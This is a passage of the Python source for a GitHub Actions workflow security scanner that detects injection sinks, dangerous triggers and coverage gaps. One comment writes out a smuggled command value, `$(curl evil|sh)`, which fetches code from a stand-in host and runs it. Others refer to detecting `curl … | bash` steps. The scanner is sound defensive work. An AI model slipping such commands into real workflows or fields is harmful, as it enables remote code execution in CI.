#!/usr/bin/env python3
"""ci-secure scanner.

Parses METADATA blocks out of references/security-patterns.md, applies the
declared detectors against workflow YAML files in the current repo, and
emits a JSON document on stdout describing the findings. See the catalog's
"METADATA schema" section for the supported detector types.

Usage:
    scan.py [--catalog PATH] [--root PATH] [--repo OWNER/REPO]
            [--gh-impostor auto|on|off]

`--gh-impostor` gates the one network-gated detector (P14.11). `auto`
(the default) runs it iff `gh` is authenticated; `on` requires it; `off`
skips it. Every outcome is recorded in the output's `gh_checks` — a skip
is never silence.

Exit codes:
    0  success (with or without findings)
    1  scanner error — a coverage failure, never a clean result: catalog
       parse/validation failure, no workflows directory, or workflow files
       that exist on disk but were not discovered
    2  invalid arguments — a malformed `--repo`, OR `--gh-impostor=on`
       with no authenticated gh (the required check could not run)
"""

from __future__ import annotations

import argparse
import datetime as _dt
import fnmatch
import glob
import json
import os
import re
import shlex
import subprocess
import sys
import time
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from functools import lru_cache
from pathlib import Path
from typing import Any, Iterator, Literal, TypedDict, get_args

Severity = Literal["HIGH", "MEDIUM", "LOW", "MANUAL"]
Detector = Literal[
    "regex",
    "yaml-path",
    "yaml-path-absent",
    "yaml-on-trigger",
    "yaml-run-injection",
    "yaml-job-correlated",       # two predicates that must coexist on one job
    "yaml-workflow-correlated",  # two predicates that must coexist at workflow scope
    "repo-file-check",           # reads a file outside .github/workflows/
    "gh-impostor-sha",           # the one NETWORK-GATED detector: verifies each
                                 # unique `uses: owner/repo@<40-hex>` pin against
                                 # the GitHub API (does the canonical repo contain
                                 # this commit?). Runs only when gh is
                                 # authenticated; scan output records ran/skipped
                                 # so a skip is never a silent pass.
    "manual",                    # documentation-only: never scanned. Coverage
                                 # is provided out-of-band (human review); the
                                 # catalog entry exists for reference.
]


class Finding(TypedDict):
    """Required base shape of a single finding emitted to the report.

    ``total=True`` (the default) deliberately: these eleven keys are
    emitted by the scan producer, so the
    type says what the prose used to only describe — a finding without,
    say, ``severity`` or ``line`` is malformed, not merely "optional".
    ``report.py`` validates incoming findings against this contract at its
    JSON-load boundary (``_validate_findings``) and surfaces violations
    loudly rather than rendering them with silent defaults (severity →
    MANUAL, line → 0), which would bury a real finding at the bottom of the
    report. Optional, producer-specific keys live on ``FindingExtra``.
    """
    id: str
    pattern: str
    severity: Severity
    title: str
    workflow_file: str
    line: int
    affected_jobs: list[str]
    workflow_activity: dict[str, Any]
    evidence: str
    fix_strategy: str
    fix_recipe_anchor: str


class FindingExtra(Finding, total=False):
    """``Finding`` plus the keys some producers add. All optional."""
    # Merged onto every member of a group by the orchestrator at runtime
    # (SKILL.md Phase 2.5): the repo-grounded exploitation scenario the
    # report renders as its "What an attacker could do" row. Absent → the
    # report falls back to the catalog's static capability line.
    attacker_scenario: str
    audit_id: str
    audit_url: str
    # "source" (evidence quotes the workflow verbatim) or "derived" (evidence
    # is a claim the scanner assembled about the file — the correlated chain
    # detectors state two facts that coexist). Absent is read as "source".
    evidence_kind: str

try:
    import yaml  # PyYAML
except ImportError:
    print(
        "ERROR: PyYAML is required. Install with: pip install pyyaml",
        file=sys.stderr,
    )
    sys.exit(1)

# Allow `from config import ...` and `from gh_utils import ...` regardless
# of where this script is invoked from.
_THIS_DIR = Path(__file__).resolve().parent
if str(_THIS_DIR) not in sys.path:
    sys.path.insert(0, str(_THIS_DIR))

from config import (  # noqa: E402
    ACTIVITY_RUN_LIMIT,
    DORMANT_DAYS,
    setup_logging,
)

logger = setup_logging(__name__)


# A METADATA block is an HTML comment beginning with `<!-- METADATA` on its
# own line and ending with `-->`. Each line is `key: value`. The block is
# attached to the most recent `### Pxx.y` heading.
_PATTERN_HEADING = re.compile(r"^###\s+(P\d+(?:\.\d+)?)\s+", re.MULTILINE)
_PATTERN_HEADING_FULL = re.compile(r"^###\s+(.+?)\s*$", re.MULTILINE)
_METADATA_BLOCK = re.compile(
    r"<!--\s*METADATA\s*(.*?)\s*-->",
    re.DOTALL,
)
# Characters that survive GitHub's heading-slug algorithm. Anything outside
# this set is dropped, then spaces are converted to hyphens. Mirrors the
# behavior of GitHub's blob renderer for `###`-style anchors.
_SLUG_KEEP = re.compile(r"[^a-z0-9 \-_]")


_VALID_SEVERITIES = frozenset(get_args(Severity))
_VALID_DETECTORS = frozenset(get_args(Detector))


@dataclass(frozen=True)
class CatalogEntry:
    pattern: str
    severity: Severity
    detector: Detector
    affected_files: list[str]
    fix_strategy: str
    title_template: str
    match: str | None = None
    yaml_path: str | None = None
    yaml_value: str | None = None
    trigger_keys: list[str] | None = None
    # New: named correlation/check identifier for the three new
    # detector classes. Each names a Python function in scan.py's
    # CORRELATION / FILE_CHECK dispatch tables — keeps METADATA
    # short while letting the catalog opt into specific predicates.
    correlation: str | None = None
    file_check: str | None = None
    anchor: str = ""

    def __post_init__(self) -> None:
        if self.severity not in _VALID_SEVERITIES:
            raise ValueError(
                f"Pattern {self.pattern}: unknown severity {self.severity!r}"
            )
        if self.detector not in _VALID_DETECTORS:
            raise ValueError(
                f"Pattern {self.pattern}: unknown detector {self.detector!r}"
            )
        if self.detector in ("regex", "yaml-run-injection") and not self.match:
            raise ValueError(
                f"Pattern {self.pattern}: {self.detector} detector requires match"
            )
        if (
            self.detector in ("yaml-path", "yaml-path-absent")
            and not self.yaml_path
        ):
            raise ValueError(
                f"Pattern {self.pattern}: {self.detector} requires yaml_path"
            )
        if self.detector == "yaml-on-trigger" and not self.trigger_keys:
            raise ValueError(
                f"Pattern {self.pattern}: yaml-on-trigger requires trigger_keys"
            )
        if (
            self.detector
            in ("yaml-job-correlated", "yaml-workflow-correlated")
            and not self.correlation
        ):
            raise ValueError(
                f"Pattern {self.pattern}: {self.detector} requires correlation"
            )
        if self.detector == "repo-file-check" and not self.file_check:
            raise ValueError(
                f"Pattern {self.pattern}: repo-file-check requires file_check"
            )

    @property
    def affected_globs(self) -> list[str]:
        return [g.strip() for g in self.affected_files if g.strip()]


def _parse_metadata_block(body: str) -> dict[str, str]:
    out: dict[str, str] = {}
    for raw_line in body.splitlines():
        line = raw_line.strip()
        if not line or ":" not in line:
            continue
        key, _, value = line.partition(":")
        out[key.strip()] = value.strip().strip('"')
    return out


def _github_slug(heading_text: str) -> str:
    """Reproduce GitHub's heading-anchor slug algorithm.

    GitHub lowercases the heading, drops every character outside
    ``[a-z0-9 _-]``, then replaces spaces with hyphens. Em-dashes and
    other punctuation become empty strings, which often produces visible
    double-hyphens (e.g. ``p148--id-token-write-...``).
    """
    text = heading_text.lower()
    text = _SLUG_KEEP.sub("", text)
    return text.replace(" ", "-")


def _anchor_for(pattern: str, heading_text: str) -> str:
    """Return the GitHub-style anchor for a catalog pattern heading.

    Always derived from the full heading text so cross-links resolve
    against GitHub's rendered anchor (e.g. ``p148--id-token-write-...``)
    rather than the bare pattern id.
    """
    return _github_slug(heading_text)


class CoverageError(RuntimeError):
    """A scan could not cover what it claims to cover.

    Raised — never swallowed — when the scanner would otherwise emit a
    result that reads as clean while a check silently did not happen: a
    catalog entry that failed to load (its chain would simply vanish from
    the report), or workflow files that exist on disk but were not
    discovered. ``main()`` turns it into exit 1.
    """


def load_catalog(catalog_path: Path) -> list[CatalogEntry]:
    """Parse every ``### Pxx.y`` section's METADATA block into a CatalogEntry.

    STRICT by construction: a section that fails to yield a valid entry
    raises instead of being skipped. A dropped entry is invisible in the
    output — the chain is simply never evaluated and the report says
    "clean" — so a one-character METADATA typo would silently delete a
    detector. Failing the whole load makes that a loud coverage failure.
    """
    if not catalog_path.exists():
        raise FileNotFoundError(f"Catalog not found at {catalog_path}")

    text = catalog_path.read_text(encoding="utf-8")

    headings: list[tuple[str, int]] = [
        (m.group(1), m.start()) for m in _PATTERN_HEADING.finditer(text)
    ]
    if not headings:
        raise ValueError(f"No pattern headings found in {catalog_path}")

    section_bounds: list[tuple[str, int, int]] = []
    for i, (pattern, start) in enumerate(headings):
        end = headings[i + 1][1] if i + 1 < len(headings) else len(text)
        section_bounds.append((pattern, start, end))

    entries: list[CatalogEntry] = []
    for pattern_id, start, end in section_bounds:
        section = text[start:end]
        heading_match = _PATTERN_HEADING_FULL.search(section)
        heading_text = heading_match.group(1).strip() if heading_match else pattern_id
        m = _METADATA_BLOCK.search(section)
        if not m:
            raise ValueError(
                f"Pattern {pattern_id}: no METADATA block — the section cannot "
                f"be scanned"
            )
        meta = _parse_metadata_block(m.group(1))
        if meta.get("pattern") and meta["pattern"] != pattern_id:
            raise ValueError(
                f"Pattern {pattern_id}: heading mismatches METADATA pattern "
                f"{meta['pattern']}"
            )

        affected_files = [
            g.strip()
            for g in (meta.get("affected_files") or "").split(",")
            if g.strip()
        ]
        trigger_keys: list[str] | None = None
        raw_trigger_keys = meta.get("trigger_keys")
        if raw_trigger_keys:
            trigger_keys = [k.strip() for k in raw_trigger_keys.split(",") if k.strip()]

        try:
            entries.append(
                CatalogEntry(
                    pattern=pattern_id,
                    severity=meta.get("severity", "MANUAL"),
                    # No default for `detector`: a missing key is a real
                    # catalog bug, and the KeyError below is re-raised as a
                    # ValueError naming the pattern rather than a silent
                    # post-init validation failure on an inscrutable
                    # `"manual"` string that's no longer a valid value.
                    detector=meta["detector"],
                    affected_files=affected_files,
                    fix_strategy=meta.get("fix_strategy", ""),
                    title_template=meta.get(
                        "title_template", "Finding in {basename}"
                    ),
                    match=meta.get("match"),
                    yaml_path=meta.get("yaml_path"),
                    yaml_value=meta.get("yaml_value"),
                    trigger_keys=trigger_keys,
                    correlation=meta.get("correlation"),
                    file_check=meta.get("file_check"),
                    anchor=_anchor_for(pattern_id, heading_text),
                )
            )
        except KeyError as e:
            raise ValueError(
                f"Pattern {pattern_id}: METADATA missing required key {e}"
            ) from e

    # Catalog-load-time validation: reject entries whose
    # correlation/file_check identifier doesn't resolve to a real
    # dispatch function. The tables are defined later in this module,
    # but `_validate_catalog_dispatch` is called only at load time so
    # they're populated by then.
    return _validate_catalog_dispatch(entries)


def discover_workflow_files(root: Path, globs: list[str]) -> list[Path]:
    """Resolve ``globs`` under ``root``.

    ``root`` is escaped: it is a filesystem path, not a pattern, and a
    literal glob metacharacter in a directory name (``/tmp/repo[1]/``) would
    otherwise be interpreted as a character class and match nothing — every
    workflow silently invisible, the scan "clean".
    """
    seen: set[Path] = set()
    root_pattern = glob.escape(str(root))
    for pattern in globs:
        for match in glob.glob(os.path.join(root_pattern, pattern), recursive=True):
            p = Path(match).resolve()
            if p.is_file():
                seen.add(p)
    return sorted(seen)


def all_workflow_files(root: Path) -> list[Path]:
    # The `.*` patterns are not redundant: `glob` refuses to match a leading
    # dot with `*`, so a dot-prefixed workflow (`.test.yml`, as moby ships)
    # was invisible to discovery while the coverage tripwire's directory
    # listing — the ground truth — saw it, and the whole repo was refused.
    return discover_workflow_files(
        root,
        [
            ".github/workflows/*.yml", ".github/workflows/*.yaml",
            ".github/workflows/.*.yml", ".github/workflows/.*.yaml",
        ],
    )


def _undiscovered_workflows(root: Path, discovered: list[Path]) -> list[str]:
    """Workflow files present in ``.github/workflows/`` that discovery missed.

    Discovery returning nothing where the directory plainly holds workflow
    YAML is not an empty repo — it is a broken scan that would render as a
    clean one. Compared by resolved path so a symlinked or escaped root
    can't produce a phantom mismatch.
    """
    wf_dir = root / ".github" / "workflows"
    if not wf_dir.is_dir():
        return []
    found = {p.resolve() for p in discovered}
    try:
        listed = sorted(
            p for p in wf_dir.iterdir()
            if p.is_file() and p.suffix in (".yml", ".yaml")
        )
    except OSError as e:
        logger.warning("could not list %s: %s", wf_dir, e)
        return []
    return [p.name for p in listed if p.resolve() not in found]


@dataclass(frozen=True)
class RawHit:
    """An immutable detector hit. Produced by a detector generator and
    consumed straight into a ``Finding`` dict — never mutated — so it's
    frozen, matching the sibling ``CatalogEntry``."""
    line: int
    evidence: str
    match_text: str
    # True when `evidence` is a sentence this scanner SYNTHESIZED about the
    # workflow (the correlated chain detectors state two facts that coexist)
    # rather than lines quoted verbatim from the file. The report must not
    # dress a derived claim as quoted source — a reader who opens the file
    # looking for that text does not find it.
    derived: bool = False
    # An optional SECOND claim, always derived, rendered under the verbatim
    # evidence and labelled as assembled-by-the-scanner. It exists for a
    # detector whose finding is "this quoted line, *because of* a condition
    # elsewhere in the job" (P14.25: an install command is only a finding when
    # the same job holds secrets or a write scope). Folding that condition into
    # `evidence` would either lose the verbatim quote or dress the derived half
    # as source; a separate field keeps both honest.
    derived_note: str | None = None


def detect_regex(file_path: Path, pattern: str) -> Iterator[RawHit]:
    content = _read_text_safe(file_path)
    if not content:
        return
    lines = content.splitlines()
    compiled = re.compile(pattern, re.MULTILINE)
    for m in compiled.finditer(content):
        line_no = content.count("\n", 0, m.start()) + 1
        idx = line_no - 1
        start = max(0, idx - 1)
        stop = min(len(lines), idx + 2)
        evidence_lines = []
        for i in range(start, stop):
            marker = " <-- here" if i == idx else ""
            evidence_lines.append(f"{i + 1:>4}: {lines[i]}{marker}")
        yield RawHit(
            line=line_no,
            evidence="\n".join(evidence_lines),
            match_text=m.group(0),
        )


def _walk_yaml_path(node: Any, parts: list[str]) -> Iterator[Any]:
    if not parts:
        yield node
        return
    head, *rest = parts
    if isinstance(node, dict):
        if head == "*":
            for v in node.values():
                yield from _walk_yaml_path(v, rest)
        elif head in node:
            yield from _walk_yaml_path(node[head], rest)
    elif isinstance(node, list) and head == "*":
        for item in node:
            yield from _walk_yaml_path(item, rest)


def _read_text_safe(file_path: Path) -> str:
    """Read a file as text. Logs and returns ``""`` on OSError.

    Returning ``""`` lets callers short-circuit cleanly; the warning
    keeps the failure visible so a permission-denied file isn't silently
    excluded from the scan.
    """
    try:
        return file_path.read_text(encoding="utf-8", errors="replace")
    except OSError as e:
        logger.warning("Could not read %s: %s", file_path, e)
        return ""


# Files whose parse failure has already been reported this process. Every
# detector re-parses each workflow, so one broken file printed the same
# multi-line PyYAML error seven to nine times and buried the rest of stderr.
# The file is still reported once, and still recorded as a coverage gap.
_PARSE_FAILURES_LOGGED: set[str] = set()


def _parse_yaml_text(text: str, file_path: Path, quiet: bool = False) -> Any:
    """Parse already-read YAML text. ``file_path`` is used only for logging.

    ``quiet`` is for a second pass over files the scan has already reported on
    (the scored config facts re-parse every workflow): the failure is real, but
    announcing it again tells the operator nothing new.
    """
    try:
        return yaml.safe_load(text)
    except yaml.YAMLError as e:
        key = str(file_path)
        if not quiet and key not in _PARSE_FAILURES_LOGGED:
            _PARSE_FAILURES_LOGGED.add(key)
            logger.warning("YAML parse error in %s: %s", file_path, e)
        else:
            logger.debug("YAML parse error in %s (already reported)", file_path)
        return None


def _probe_scannability(file_path: Path) -> str | None:
    """Return a coverage-gap reason if a workflow can't be fully scanned, else None.

    The per-detector early-returns (``if doc is None: return`` and the
    ``_read_text_safe`` -> ``""`` short-circuit) collapse a file that *failed*
    to read or parse into the same empty result as a file that scanned cleanly.
    For a security scanner that silently turns a missing check into a clean
    bill of health, so ``scan()`` probes every workflow once and records the
    failures in ``scan_incomplete`` so report.py can name them loudly.
    Outcomes:

    - OSError on read -> NO detector evaluated the file (gap covers all patterns).
    - ``yaml.YAMLError`` -> regex detectors still ran on the raw text, but every
      YAML-based detector (yaml-path, yaml-on-trigger, the parse half of
      yaml-run-injection, all correlations, and ``affected_jobs_for``) yielded
      nothing — the file is NOT clean for those patterns, it was never checked.
    - valid YAML but NOT a top-level mapping (a list/scalar) -> same problem:
      every YAML detector bails on ``if not isinstance(doc, dict)``, so it was
      never evaluated for those patterns; record a gap, don't call it clean.
    - readable + parses to a mapping (or a legitimately empty file) -> ``None``.
    """
    try:
        text = file_path.read_text(encoding="utf-8", errors="replace")
    except OSError as e:
        return f"unreadable — not scanned for any pattern ({e})"
    try:
        doc = yaml.safe_load(text)
    except yaml.YAMLError as e:
        # PyYAML messages span several lines (problem + context + marker);
        # collapse to one line so the report banner stays scannable.
        detail = " ".join(str(e).split())
        return (
            "YAML parse error — not scanned for any YAML-based pattern "
            f"(regex patterns still ran): {detail}"
        )
    # Valid YAML, but a top-level list/scalar rather than a workflow mapping:
    # every YAML-based detector short-circuits on `not isinstance(doc, dict)`,
    # so the file was NOT evaluated for those patterns and must not read as
    # clean. An empty file (`doc is None`) is a legitimately-empty workflow.
    if doc is not None and not isinstance(doc, dict):
        return (
            f"top-level YAML is a {type(doc).__name__}, not a workflow mapping "
            "— no YAML-based pattern was evaluated (regex patterns still ran)"
        )
    return None


def _find_line_for_top_level_key(lines: list[str], key: str) -> int | None:
    """Best-effort line number for a top-level key in pre-split YAML lines.

    Returns ``None`` when the key can't be located so callers can avoid
    pointing the user at line 1 with no real evidence. Used for evidence
    rendering on yaml-path detectors where the loader doesn't preserve
    source locations.
    """
    pattern = re.compile(rf"^\s*{re.escape(key)}\s*:")
    for i, line in enumerate(lines, start=1):
        if pattern.match(line):
            return i
    return None


def detect_yaml_path(
    file_path: Path, yaml_path: str, value_filter: str | None = None
) -> Iterator[RawHit]:
    """Fire when ``yaml_path`` resolves in the document.

    When ``value_filter`` is supplied, only fire if at least one resolved
    leaf equals it (case-insensitive, after str-cast). Lets a single
    detector ignore hardened spellings like ``id-token: none`` while
    still flagging ``id-token: write``.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if doc is None:
        return
    parts = [p for p in yaml_path.split(".") if p]
    matches = list(_walk_yaml_path(doc, parts))
    if not matches:
        return
    if value_filter is not None:
        wanted = value_filter.strip().lower()
        if not any(str(leaf).strip().lower() == wanted for leaf in matches):
            return
    lines = text.splitlines()
    # We don't have source positions from yaml.safe_load. Approximate by
    # locating the top-level key in the file.
    top_key = parts[0] if parts else ""
    located = _find_line_for_top_level_key(lines, top_key) if top_key else None
    if located is None:
        line_no = 1
        evidence = f"(matched yaml path) {yaml_path}"
    else:
        line_no = located
        end = min(len(lines), line_no + 5)
        evidence = "\n".join(
            f"{i + 1:>4}: {lines[i]}" for i in range(line_no - 1, end)
        )
    yield RawHit(
        line=line_no,
        evidence=evidence,
        match_text=yaml_path,
    )


def _get_on_node(doc: Any) -> Any:
    """Return the workflow's ``on:`` value, accounting for YAML 1.1.

    PyYAML's default loader coerces the bareword key ``on`` to the
    boolean ``True`` (YAML 1.1 inheritance), so we check both shapes.
    """
    if not isinstance(doc, dict):
        return None
    if "on" in doc:
        return doc["on"]
    if True in doc:
        return doc[True]
    return None


def _on_trigger_names(on_node: Any) -> list[str]:
    """Normalize the three legal shapes of ``on:`` to a list of trigger names.

    - ``on: push`` (string)        → ``["push"]``
    - ``on: [push, issues]`` (list) → ``["push", "issues"]``
    - ``on: { push: ..., issues: ... }`` (mapping) → ``["push", "issues"]``
    """
    if isinstance(on_node, str):
        return [on_node]
    if isinstance(on_node, list):
        return [str(item) for item in on_node if isinstance(item, str)]
    if isinstance(on_node, dict):
        return [str(key) for key in on_node.keys() if isinstance(key, str)]
    return []


def detect_yaml_on_trigger(
    file_path: Path, danger_keys: list[str]
) -> Iterator[RawHit]:
    """Fire when ``on:`` declares any trigger from a configured danger list.

    Handles all three legal ``on:`` shapes (string, list, mapping) and
    the YAML 1.1 ``on`` → ``True`` boolean coercion. Avoids the
    false-positive class that plain ``^\\s+TRIGGER:`` regex hits when
    the same word appears under ``permissions:``, ``with:``, etc.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if doc is None:
        return
    on_node = _get_on_node(doc)
    if on_node is None:
        return
    triggers = _on_trigger_names(on_node)
    danger_set = set(danger_keys)
    hit_keys = sorted(set(triggers) & danger_set)
    if not hit_keys:
        return
    lines = text.splitlines()
    for trigger in hit_keys:
        # Try to locate the trigger keyword inside the on: block. Fall
        # back to the on: header line if we can't pinpoint it.
        pattern = re.compile(rf"^\s+{re.escape(trigger)}\s*:")
        located: int | None = None
        for i, line in enumerate(lines, start=1):
            if pattern.match(line):
                located = i
                break
        if located is None:
            located = _find_line_for_top_level_key(lines, "on") or 1
            evidence = f"on: includes {trigger}"
        else:
            idx = located - 1
            start = max(0, idx - 1)
            stop = min(len(lines), idx + 2)
            evidence = "\n".join(
                f"{i + 1:>4}: {lines[i]}{' <-- here' if i == idx else ''}"
                for i in range(start, stop)
            )
        yield RawHit(line=located, evidence=evidence, match_text=trigger)


_RUN_KEY_RE = re.compile(r"^\s*-?\s*run\s*:", re.MULTILINE)

# Context fields GitHub generates itself, whose VALUE SHAPE cannot carry shell
# metacharacters: integers (`.number`, `.id`), 40-hex object ids (`.sha`,
# `.head_sha`, `.merge_commit_sha`) and booleans (`.repo.fork`, `.merged`).
# Interpolating one of these into a `run:` step is not an injection sink — no
# attacker-supplied text reaches the shell — and flagging them buried the real
# text-shaped hits (PR titles, bodies, branch names, comments, labels,
# client_payload) under noise. Everything text-shaped stays in scope.
#
# These are suffixes of a fully-qualified `github.*` context path, and
# `_is_shape_safe_expression` enforces that prefix: a bare `endswith` would
# suppress any expression that merely ends in `.sha`.
#
# `github.event.action` used to sit in a companion exact-match set. It was
# dead code: the P14.10 regex only matches `github.event.<issue|comment|
# pull_request|discussion|workflow_run|head_commit|inputs|client_payload>.*`,
# `github.event.inputs.*` and `github.head_ref`, so a bare
# `github.event.action` is never a match to suppress in the first place.
#
# `.commits` joins the integer arm: on a `pull_request` payload it is the
# commit COUNT, the same GitHub-generated integer shape as `.number`. grafana's
# `trufflehog.yml` wrote `$(( ${{ github.event.pull_request.commits }} + 2 ))`
# — arithmetic on it, which only reads at all because the value is an integer —
# and the finding rendered HIGH. (The push-event `github.event.commits` ARRAY
# is a different field and is not a P14.10 match at all: the regex only reaches
# `github.event.<issue|comment|pull_request|discussion|workflow_run|
# head_commit|inputs|client_payload>.*`.)
#
# `.author_association` is not a number but is just as shape-constrained: it is
# a CLOSED ENUM GitHub fills in (OWNER, MEMBER, COLLABORATOR, CONTRIBUTOR,
# FIRST_TIME_CONTRIBUTOR, FIRST_TIMER, MANNEQUIN, NONE). No member carries a
# shell metacharacter and no attacker can add a member, so interpolating one
# into `run:` is not an injection sink. This REVERSES a class the catalog
# previously declared in scope ("author associations" was listed among the
# text-shaped fields that stay) — react's four `shared_label_core_team_prs` /
# `*_discord_notify` findings were all this shape and all false.
# `.login` is a GitHub account/org LOGIN — `github.event.*.user.login`,
# `.sender.login`, `.repo.owner.login`, etc. GitHub enforces the login charset
# (alphanumerics and single, non-leading/trailing hyphens, ≤39 chars), so it
# cannot carry a shell metacharacter — not even the login an attacker chose for
# their own fork account. So `github.event.issue.user.login` in a `run:` block
# is not an injection sink and must not fire P14.10 HIGH (astro's headline
# finding was exactly this false positive). The `github.` prefix gate plus the
# `_ATTACKER_FILLED_PREFIXES` carve-out still apply: a `.login` under
# `client_payload.*` / `inputs.*` is caller-filled and stays in scope.
_SAFE_EXPR_SUFFIXES = (
    ".number", ".id", ".commits",
    ".sha", ".head_sha", ".merge_commit_sha",
    ".fork", ".merged",
    ".author_association",
    ".login",
)

# …but the value-shape argument only holds where GITHUB fills the field in.
# Three namespaces are filled in by whoever fired the event: `client_payload`
# is the arbitrary JSON body of a `repository_dispatch`, and both
# `github.event.inputs.*` (the legacy spelling) and the bare `inputs.*` context
# (the modern `workflow_dispatch` / `workflow_call` spelling) are caller-chosen
# inputs. A caller is free to send `{"sha": "$(curl evil|sh)"}` — the NAME says
# sha, nothing enforces the shape. So a safe-looking suffix under these
# prefixes proves nothing, and the catalog says so too. They stay in scope
# whatever they are called.
_ATTACKER_FILLED_PREFIXES = (
    "github.event.client_payload.",
    "github.event.inputs.",
    "inputs.",
)


# Matches a detector found but could not anchor to a raw line, and therefore
# did NOT report. Collected here rather than returned, because detectors are
# generators whose only channel to the caller is the RawHit stream — and a
# dropped match is the opposite of a hit. `scan()` clears this before a run and
# emits it as its OWN findings-JSON list, `dropped_matches`.
#
# It is deliberately NOT folded into `scan_incomplete`. Those two are different
# facts and everything downstream reads them differently: `scan_incomplete`
# means "this FILE could not be read or parsed", which makes every workflow-
# scoped config fact unmeasurable. A dropped match means the file parsed
# perfectly and one `run:` step inside it could not be anchored to raw lines.
# Folding the second into the first demoted every fact of a healthy repo to
# unmeasured and graded it 0.0/100 over a single folded `run: >` scalar, and
# made the banner count matches while calling them files. Coverage still
# degrades to PARTIAL on either — an unanchored step is a real hole — but the
# report says which hole it is.
_DROPPED_MATCHES: list[dict[str, str]] = []


def _record_dropped_match(file_path: Path, reason: str) -> None:
    _DROPPED_MATCHES.append({"file": str(file_path), "reason": reason})


def _repo_relative(path: str, root: Path) -> str:
    """A workflow path as it should appear in the report: relative to the
    audited root, and NEVER absolute.

    The report is a shareable artifact — an absolute path leaks the operator's
    filesystem layout into it. `relative_to` raises when the file genuinely
    resolves outside the root (a symlinked workflow directory), and the
    fallback there used to hand the raw absolute path straight through, so the
    one branch that needed the guard was the one branch that skipped it.
    """
    try:
        return str(Path(path).resolve().relative_to(root.resolve()))
    except ValueError:
        return os.path.relpath(str(path), str(root))


def _is_shape_safe_expression(snippet: str) -> bool:
    """Is this matched **template expression** one whose value shape rules out
    shell injection? See ``_SAFE_EXPR_SUFFIXES`` and
    ``_ATTACKER_FILLED_PREFIXES``.

    Hard-gated to text that really is a ``${{ … }}`` template expression. The
    same run-scalar detector also carries the shell-command regexes (P14.24's
    `curl … | bash`), whose matches are arbitrary shell text — and a
    suppression list written about `${{ … }}` value shapes has no jurisdiction
    there. Without this gate a future `_SAFE_EXPR_SUFFIXES` entry that happened
    to end a `curl … | bash` command would silently suppress a HIGH finding.
    Anything that is not a template expression is never shape-safe.
    """
    expr = snippet.strip()
    if not expr.startswith("${{"):
        return False
    expr = expr[3:]
    if expr.endswith("}}"):
        expr = expr[:-2]
    expr = expr.strip()
    # `${{ A || B }}` is shape-safe only when EVERY operand is. Two wrong rules
    # were tried and both lose findings:
    #   - judging the whole expression, or its LAST operand, lets a safe-shaped
    #     fallback launder a text-shaped primary — cal.com's
    #     `${{ github.head_ref || github.ref_name }}` is a branch name first and
    #     a fallback second;
    #   - judging only the FIRST operand assumes the first operand is always
    #     truthy. It is not: an event field absent on THIS event is empty, so
    #     `${{ github.event.pull_request.number || github.event.issue.title }}`
    #     resolves to the issue title on an `issues` trigger and the title
    #     reaches the shell. Same for `.merged` (false on an open PR) and any
    #     other falsy-able shape-safe field.
    # Testing every operand keeps the cal.com fix and closes both.
    operands = [p.strip() for p in expr.split("||")]
    return all(_is_shape_safe_operand(p) for p in operands if p)


_LITERAL_OPERAND_RE = re.compile(r"""^(?:'[^']*'|"[^"]*"|-?\d+(?:\.\d+)?)$""")


def _is_shape_safe_operand(expr: str) -> bool:
    """One `||` operand of a template expression, judged on its own."""
    # A quoted string or a number literal is author-written, not attacker text:
    # `${{ github.event.pull_request.title || '' }}` is unsafe because of the
    # TITLE, and the `''` must not be what decides it either way.
    if _LITERAL_OPERAND_RE.match(expr):
        return True
    if expr.startswith(_ATTACKER_FILLED_PREFIXES):
        return False
    # Anchored to a fully-qualified `github.*` context path. A bare
    # `endswith` would suppress ANY text ending in `.sha` — including
    # attacker-controlled text that merely looks like a context path.
    if not expr.startswith("github."):
        return False
    return expr.endswith(_SAFE_EXPR_SUFFIXES)


def detect_yaml_run_injection(
    file_path: Path, pattern: str
) -> Iterator[RawHit]:
    """Apply a regex only to the text of ``jobs.*.steps.*.run`` scalars.

    Avoids the false-positive class where the same template expression
    appears inside ``with:`` (action input) or ``env:`` (env var) blocks
    — those don't expose shell. The regex is meant for shell-injection
    sinks, and only ``run:`` scalars are shell.

    Line numbers are computed by walking a forward-only cursor through
    the file: for each step's run scalar, the cursor advances past the
    next ``run:`` key in the file before snippet search starts. This
    keeps the same template expression appearing earlier (in ``env:``
    or ``with:``) from stealing the line attribution of the real
    shell sink.

    The parsed step list can be LONGER than the file's raw ``run:`` tokens —
    a YAML alias (``steps: *common``) expands into as many parsed steps as the
    anchor holds while contributing no new raw ``run:`` line. Once the cursor
    passes the last raw token, every remaining run scalar is unanchorable, so
    those steps are recorded as dropped matches (a coverage gap the report
    names) rather than skipped in silence — silence rendered as complete
    coverage over steps nothing ever scanned.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return
    compiled = re.compile(pattern)
    lines = text.splitlines()
    file_cursor = 0
    unanchored_reported = False
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            run_text = step.get("run")
            if not isinstance(run_text, str):
                continue
            run_anchor = _RUN_KEY_RE.search(text, file_cursor)
            if run_anchor is None:
                # Unable to locate the run: key textually — we cannot scan
                # this step's shell without risking attribution to an earlier
                # non-run occurrence. This is a HOLE, not a clean step, so it
                # is recorded as a coverage gap. Once per file: after the
                # cursor runs past the last raw `run:` token every remaining
                # parsed step lands here, and one honest line beats a hundred.
                if not unanchored_reported:
                    unanchored_reported = True
                    logger.warning(
                        "yaml-run-injection: %s has run: step(s) whose shell "
                        "text could not be anchored to a raw run: line "
                        "(YAML anchor/alias expansion) — those steps were "
                        "NOT scanned for injection sinks; review them "
                        "manually", file_path,
                    )
                    _record_dropped_match(
                        file_path,
                        "a run: step's shell text could not be anchored to a "
                        "raw run: line (YAML anchor/alias expansion yields "
                        "more parsed steps than the file has run: tokens) — "
                        "it was NOT scanned for injection sinks; review the "
                        "step manually",
                    )
                continue
            file_cursor = run_anchor.end()
            search_cursor = file_cursor
            for m in compiled.finditer(run_text):
                snippet = m.group(0)
                if _is_shape_safe_expression(snippet):
                    logger.debug(
                        "yaml-run-injection: %s in %s is a GitHub-generated "
                        "value-shape-safe field — not an injection sink",
                        snippet, file_path,
                    )
                    continue
